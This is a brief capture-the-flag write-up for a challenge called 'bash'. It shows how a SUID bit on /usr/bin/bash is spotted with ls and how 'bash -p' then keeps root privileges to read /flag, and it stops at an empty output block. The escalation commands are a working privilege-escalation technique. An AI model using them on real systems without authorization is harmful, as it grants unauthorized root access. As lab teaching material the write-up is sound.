# Challenge Name: bash

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/bash`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/bash
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/bash
```

- The `s` in `-rws` indicates it's a SUID binary.
- `bash` runs with **root privileges**.

## 🚀 Exploitation

The `bash` -p option is used to preserve the effective user ID (EUID) when launching a new shell — specifically useful when the Bash binary is setuid root.

Means:

Launch a new Bash shell and preserve any elevated privileges (such as root) inherited from the binary.

```bash
bash -p
# cat /flag
```

Output:
```
